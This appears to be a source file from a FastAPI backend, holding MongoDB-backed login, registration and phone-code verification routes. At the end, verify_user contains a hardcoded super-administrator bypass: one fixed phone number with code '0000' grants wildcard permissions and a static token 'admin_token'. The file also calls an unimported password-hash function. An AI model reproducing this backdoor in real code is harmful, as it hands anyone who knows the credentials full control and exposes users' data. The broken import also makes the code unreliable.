from fastapi import APIRouter, Depends, HTTPException, status
from fastapi.security import OAuth2PasswordBearer, OAuth2PasswordRequestForm
from datetime import timedelta
from ..core.security import create_access_token, verify_password
from ..core.config import settings
from ..models.user import User, UserCreate
from ..db.mongodb import get_database
from bson import ObjectId

router = APIRouter()
oauth2_scheme = OAuth2PasswordBearer(tokenUrl=f"{settings.API_V1_STR}/auth/login")

@router.post("/auth/login")
async def login(form_data: OAuth2PasswordRequestForm = Depends()):
    db = await get_database()
    user = await db.users.find_one({"email": form_data.username})
    
    if not user or not verify_password(form_data.password, user["hashed_password"]):
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="Incorrect email or password",
            headers={"WWW-Authenticate": "Bearer"},
        )
    
    access_token_expires = timedelta(minutes=settings.ACCESS_TOKEN_EXPIRE_MINUTES)
    access_token = create_access_token(
        data={"sub": str(user["_id"])}, expires_delta=access_token_expires
    )
    
    return {
        "access_token": access_token,
        "token_type": "bearer",
        "user": {
            "id": str(user["_id"]),
            "email": user["email"],
            "username": user["username"],
            "is_admin": user["is_admin"]
        }
    }

@router.post("/auth/register", response_model=User)
async def register(user_in: UserCreate):
    db = await get_database()
    
    # Check if email already exists
    if await db.users.find_one({"email": user_in.email}):
        raise HTTPException(
            status_code=status.HTTP_400_BAD_REQUEST,
            detail="Email already registered"
        )
    
    user_dict = user_in.dict()
    hashed_password = get_password_hash(user_dict.pop("password"))
    user_dict["hashed_password"] = hashed_password
    
    result = await db.users.insert_one(user_dict)
    user_dict["id"] = str(result.inserted_id)
    
    return user_dict 

async def verify_user(phone: str, verification_code: str):
    # 超级管理员账号验证
    if phone == "13911160174" and verification_code == "0000":
        return {
            "success": True,
            "data": {
                "user": {
                    "id": "admin",
                    "phone": phone,
                    "role": "admin",
                    "name": "超级管理员",
                    "permissions": ["*"]  # 所有权限
                },
                "token": "admin_token"
            }
        }
    
    # 其他用户的验证逻辑保持不变
    ...